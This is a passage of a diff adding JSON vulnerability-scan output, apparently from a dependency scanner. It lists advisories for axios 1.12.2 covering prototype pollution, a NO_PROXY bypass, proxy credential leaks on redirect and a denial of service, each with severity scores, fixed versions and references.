+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:2a960e7b7c9e2b586d638e66788574315f6b58627c57304c4846a9d388651e56",
+          "Title": "axios: Axios: Arbitrary HTTP header injection via prototype pollution",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, a prototype pollution gadget exists in the Axios HTTP adapter (lib/adapters/http.js) that allows an attacker to inject arbitrary HTTP headers into outgoing requests. The vulnerability exploits duck-type checking of the data payload, where if Object.prototype is polluted with getHeaders, append, pipe, on, once, and Symbol.toStringTag, Axios misidentifies any plain object payload as a FormData instance and calls the attacker-controlled getHeaders() function, merging the returned headers into the outgoing request. The vulnerable code resides exclusively in lib/adapters/http.js. The prototype pollution source does not need to originate from Axios itself — any prototype pollution primitive in any dependency in the application's dependency tree is sufficient to trigger this gadget. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-113",
+            "CWE-1321"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-42035",
+            "https://advisory.echohq.com/cve/CVE-2026-42035",
+            "https://github.com/advisories/GHSA-6chq-wfr3-2hj9",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-6chq-wfr3-2hj9",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42035",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42035"
+          ],
+          "PublishedDate": "2026-04-24T18:16:30.273Z",
+          "LastModifiedDate": "2026-06-17T10:47:20.66Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42043",
+          "VendorIDs": [
+            "GHSA-pmwg-cvhr-8vh7"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.15.1, 0.31.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42043",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:b8ac8a0353713930b43cd32885793240d98bb641bb7677aafe08981a09bf72b2",
+          "Title": "axios: Axios: NO_PROXY bypass via crafted URL",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, an attacker who can influence the target URL of an Axios request can use any address in the 127.0.0.0/8 range (other than 127.0.0.1) to completely bypass the NO_PROXY protection. This vulnerability is due to an incomplete for CVE-2025-62718, This vulnerability is fixed in 1.15.1 and 0.31.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-183",
+            "CWE-441",
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 4,
+            "redhat": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+              "V3Score": 7.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
+              "V3Score": 10
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+              "V3Score": 7.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:14937",
+            "https://access.redhat.com/errata/RHSA-2026:16476",
+            "https://access.redhat.com/errata/RHSA-2026:16532",
+            "https://access.redhat.com/errata/RHSA-2026:16534",
+            "https://access.redhat.com/errata/RHSA-2026:16535",
+            "https://access.redhat.com/errata/RHSA-2026:16542",
+            "https://access.redhat.com/errata/RHSA-2026:16874",
+            "https://access.redhat.com/errata/RHSA-2026:17468",
+            "https://access.redhat.com/errata/RHSA-2026:17474",
+            "https://access.redhat.com/errata/RHSA-2026:17657",
+            "https://access.redhat.com/errata/RHSA-2026:17699",
+            "https://access.redhat.com/errata/RHSA-2026:19109",
+            "https://access.redhat.com/errata/RHSA-2026:19375",
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:21017",
+            "https://access.redhat.com/errata/RHSA-2026:21338",
+            "https://access.redhat.com/errata/RHSA-2026:21772",
+            "https://access.redhat.com/errata/RHSA-2026:22465",
+            "https://access.redhat.com/errata/RHSA-2026:22619",
+            "https://access.redhat.com/errata/RHSA-2026:22629",
+            "https://access.redhat.com/errata/RHSA-2026:22840",
+            "https://access.redhat.com/errata/RHSA-2026:23361",
+            "https://access.redhat.com/errata/RHSA-2026:24536",
+            "https://access.redhat.com/errata/RHSA-2026:24539",
+            "https://access.redhat.com/errata/RHSA-2026:24853",
+            "https://access.redhat.com/errata/RHSA-2026:24977",
+            "https://access.redhat.com/errata/RHSA-2026:25041",
+            "https://access.redhat.com/errata/RHSA-2026:25089",
+            "https://access.redhat.com/errata/RHSA-2026:25271",
+            "https://access.redhat.com/errata/RHSA-2026:25273",
+            "https://access.redhat.com/errata/RHSA-2026:26214",
+            "https://access.redhat.com/errata/RHSA-2026:26225",
+            "https://access.redhat.com/errata/RHSA-2026:26232",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:48670",
+            "https://access.redhat.com/security/cve/CVE-2026-42043",
+            "https://advisory.echohq.com/cve/CVE-2026-42043",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2461626",
+            "https://github.com/advisories/GHSA-pmwg-cvhr-8vh7",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-pmwg-cvhr-8vh7",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42043",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42043.json",
+            "https://ubuntu.com/security/notices/USN-8638-1",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42043"
+          ],
+          "PublishedDate": "2026-04-24T18:16:31.457Z",
+          "LastModifiedDate": "2026-09-10T13:20:04.973Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42264",
+          "VendorIDs": [
+            "GHSA-q8qp-cvcw-x6jj"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.15.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42264",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:9e0244939f23de054bf185d13d49d76bdf2cd7771015bbb743e366aec9583102",
+          "Title": "axios: Axios: Prototype pollution allows information disclosure and request manipulation",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. From version 1.0.0 to before version 1.15.2, fFive config properties (auth, baseURL, socketPath, beforeRedirect, and insecureHTTPParser) in the HTTP adapter are read via direct property access without hasOwnProperty guards, making them exploitable as prototype pollution gadgets. When Object.prototype is polluted by another dependency in the same process, axios silently picks up these polluted values on every outbound HTTP request. This issue has been patched in version 1.15.2.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1321",
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 4,
+            "redhat": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 9.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:36207",
+            "https://access.redhat.com/errata/RHSA-2026:37287",
+            "https://access.redhat.com/errata/RHSA-2026:37288",
+            "https://access.redhat.com/errata/RHSA-2026:37297",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42142",
+            "https://access.redhat.com/errata/RHSA-2026:50300",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/errata/RHSA-2026:62260",
+            "https://access.redhat.com/errata/RHSA-2026:66488",
+            "https://access.redhat.com/errata/RHSA-2026:66545",
+            "https://access.redhat.com/security/cve/CVE-2026-42264",
+            "https://advisory.echohq.com/cve/CVE-2026-42264",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2467927",
+            "https://github.com/advisories/GHSA-q8qp-cvcw-x6jj",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/47915144662f2733e6c051bdcb895a8c8f0586aa",
+            "https://github.com/axios/axios/commit/47915144662f2733e6c051bdcb895a8c8f0586aa%20%28v1.15.2%29",
+            "https://github.com/axios/axios/pull/10779",
+            "https://github.com/axios/axios/releases/tag/v1.15.2",
+            "https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42264",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42264.json",
+            "https://ubuntu.com/security/notices/USN-8638-1",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42264"
+          ],
+          "PublishedDate": "2026-05-08T04:16:20.313Z",
+          "LastModifiedDate": "2026-09-11T13:17:58.653Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44486",
+          "VendorIDs": [
+            "GHSA-j5f8-grm9-p9fc"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.16.0, 0.32.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44486",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:5f82197ea9fa41ccba80b25b6efd9a270091e2176cd9979c534b0d1c7f0beb77",
+          "Title": "axios: Axios: Information disclosure of proxy credentials via HTTP redirects",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’ Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a Proxy-Authorization header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale Proxy-Authorization header can remain on the redirected request and be sent to the redirect target. This affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-200",
+            "CWE-201"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34766",
+            "https://access.redhat.com/errata/RHSA-2026:36611",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:36820",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:36883",
+            "https://access.redhat.com/errata/RHSA-2026:40262",
+            "https://access.redhat.com/errata/RHSA-2026:41031",
+            "https://access.redhat.com/errata/RHSA-2026:41055",
+            "https://access.redhat.com/errata/RHSA-2026:41064",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42078",
+            "https://access.redhat.com/errata/RHSA-2026:42085",
+            "https://access.redhat.com/errata/RHSA-2026:42142",
+            "https://access.redhat.com/errata/RHSA-2026:42146",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:43052",
+            "https://access.redhat.com/errata/RHSA-2026:46885",
+            "https://access.redhat.com/errata/RHSA-2026:46903",
+            "https://access.redhat.com/errata/RHSA-2026:50300",
+            "https://access.redhat.com/errata/RHSA-2026:50681",
+            "https://access.redhat.com/errata/RHSA-2026:54188",
+            "https://access.redhat.com/errata/RHSA-2026:54206",
+            "https://access.redhat.com/errata/RHSA-2026:57191",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/errata/RHSA-2026:66488",
+            "https://access.redhat.com/errata/RHSA-2026:66545",
+            "https://access.redhat.com/security/cve/CVE-2026-44486",
+            "https://advisory.echohq.com/cve/CVE-2026-44486",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487947",
+            "https://github.com/advisories/GHSA-j5f8-grm9-p9fc",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/afca61a070728e717203c2bc21e7b589b59b858b",
+            "https://github.com/axios/axios/pull/10794",
+            "https://github.com/axios/axios/releases/tag/v0.32.0",
+            "https://github.com/axios/axios/releases/tag/v1.16.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-j5f8-grm9-p9fc",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44486",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44486.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44486"
+          ],
+          "PublishedDate": "2026-06-11T17:16:32.45Z",
+          "LastModifiedDate": "2026-09-11T13:18:05.413Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44487",
+          "VendorIDs": [
+            "GHSA-p92q-9vqr-4j8v"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.16.0, 0.32.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44487",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:a85c1ca1e383c19ed8720d26eade5001c4dd1477af9e130278d0df39975a504f",
+          "Title": "axios: Axios: Information disclosure of proxy credentials via redirect flows",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’s Node.js HTTP adapter may forward a Proxy-Authorization header to a redirected origin during specific proxy-to-direct redirect flows. This affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-201"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:29864",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34374",
+            "https://access.redhat.com/errata/RHSA-2026:34525",
+            "https://access.redhat.com/errata/RHSA-2026:34527",
+            "https://access.redhat.com/errata/RHSA-2026:34530",
+            "https://access.redhat.com/errata/RHSA-2026:36611",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:36820",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:36883",
+            "https://access.redhat.com/errata/RHSA-2026:40262",
+            "https://access.redhat.com/errata/RHSA-2026:40768",
+            "https://access.redhat.com/errata/RHSA-2026:40792",
+            "https://access.redhat.com/errata/RHSA-2026:40795",
+            "https://access.redhat.com/errata/RHSA-2026:41031",
+            "https://access.redhat.com/errata/RHSA-2026:41055",
+            "https://access.redhat.com/errata/RHSA-2026:41064",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42078",
+            "https://access.redhat.com/errata/RHSA-2026:42085",
+            "https://access.redhat.com/errata/RHSA-2026:42142",
+            "https://access.redhat.com/errata/RHSA-2026:42146",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:43052",
+            "https://access.redhat.com/errata/RHSA-2026:46885",
+            "https://access.redhat.com/errata/RHSA-2026:46903",
+            "https://access.redhat.com/errata/RHSA-2026:50300",
+            "https://access.redhat.com/errata/RHSA-2026:54188",
+            "https://access.redhat.com/errata/RHSA-2026:54206",
+            "https://access.redhat.com/errata/RHSA-2026:57191",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/errata/RHSA-2026:66488",
+            "https://access.redhat.com/errata/RHSA-2026:66545",
+            "https://access.redhat.com/security/cve/CVE-2026-44487",
+            "https://advisory.echohq.com/cve/CVE-2026-44487",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487948",
+            "https://github.com/advisories/GHSA-p92q-9vqr-4j8v",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/releases/tag/v0.32.0",
+            "https://github.com/axios/axios/releases/tag/v1.16.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-p92q-9vqr-4j8v",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44487",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44487.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44487"
+          ],
+          "PublishedDate": "2026-06-11T17:16:32.607Z",
+          "LastModifiedDate": "2026-09-11T13:18:06.053Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44488",
+          "VendorIDs": [
+            "GHSA-777c-7fjr-54vf"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.16.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44488",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:f36d8b28f9c7df1b95057e6882fba2e217f16ac1f1b16e42adfcd3bd7bdf139f",
+          "Title": "axios: Axios: Denial of Service due to unenforced request and response size limits",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Axios versions 1.7.0 through 1.15.x did not enforce configured request and response size limits when requests were sent with the fetch adapter. Applications that selected adapter: 'fetch', or ran in environments where axios resolved to the fetch adapter, could receive or send bodies larger than maxContentLength or maxBodyLength despite those limits being explicitly configured. This can cause resource exhaustion in server-side usage when a malicious or compromised server returns an oversized response, when an attacker can supply a large data: URL, or when an application forwards attacker-controlled request bodies through axios while relying on maxBodyLength as a boundary. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34160",
+            "https://access.redhat.com/errata/RHSA-2026:34374",
+            "https://access.redhat.com/errata/RHSA-2026:34525",
+            "https://access.redhat.com/errata/RHSA-2026:34527",
+            "https://access.redhat.com/errata/RHSA-2026:34530",
+            "https://access.redhat.com/errata/RHSA-2026:36611",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:36820",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:36883",
+            "https://access.redhat.com/errata/RHSA-2026:40262",
+            "https://access.redhat.com/errata/RHSA-2026:40768",
+            "https://access.redhat.com/errata/RHSA-2026:40792",
+            "https://access.redhat.com/errata/RHSA-2026:40795",
+            "https://access.redhat.com/errata/RHSA-2026:41031",
+            "https://access.redhat.com/errata/RHSA-2026:41055",
+            "https://access.redhat.com/errata/RHSA-2026:41064",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:42078",
+            "https://access.redhat.com/errata/RHSA-2026:42085",
+            "https://access.redhat.com/errata/RHSA-2026:42142",
+            "https://access.redhat.com/errata/RHSA-2026:42146",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:43052",
+            "https://access.redhat.com/errata/RHSA-2026:46885",
+            "https://access.redhat.com/errata/RHSA-2026:46903",
+            "https://access.redhat.com/errata/RHSA-2026:50300",
+            "https://access.redhat.com/errata/RHSA-2026:54188",
+            "https://access.redhat.com/errata/RHSA-2026:54555",
+            "https://access.redhat.com/errata/RHSA-2026:57191",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/errata/RHSA-2026:66488",
+            "https://access.redhat.com/errata/RHSA-2026:66545",
+            "https://access.redhat.com/security/cve/CVE-2026-44488",
+            "https://advisory.echohq.com/cve/CVE-2026-44488",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487949",
+            "https://github.com/advisories/GHSA-777c-7fjr-54vf",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/pull/10795",
+            "https://github.com/axios/axios/pull/10796",
+            "https://github.com/axios/axios/releases/tag/v1.16.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-777c-7fjr-54vf",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44488",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44488.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44488"
+          ],
+          "PublishedDate": "2026-06-11T17:16:32.75Z",
+          "LastModifiedDate": "2026-09-11T13:18:06.717Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44494",
+          "VendorIDs": [
+            "GHSA-35jp-ww65-95wh"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.16.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44494",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:47292c0ae8c0ac003c40c8bdbb476dac671daa30dae6b6722ddcded203b401ba",
+          "Title": "axios: Axios: Man-in-the-Middle (MITM) attack via Prototype Pollution",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. From 1.0.0 to before 1.16.0, the Axios library is vulnerable to a Prototype Pollution \"Gadget\" attack that allows any Object.prototype pollution in the application's dependency tree to be escalated into a full Man-in-the-Middle (MITM) attack — intercepting, reading, and modifying all HTTP traffic including authentication credentials. The HTTP adapter at lib/adapters/http.js:670 reads config.proxy via standard property access, which traverses the prototype chain. Because proxy is not present in Axios defaults, the merged config object has no own proxy property, making it trivially injectable via prototype pollution. Once injected, setProxy() routes all HTTP requests through the attacker's proxy server. This vulnerability is fixed in 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-441",
+            "CWE-1321",
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
+              "V3Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
+              "V3Score": 8.7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
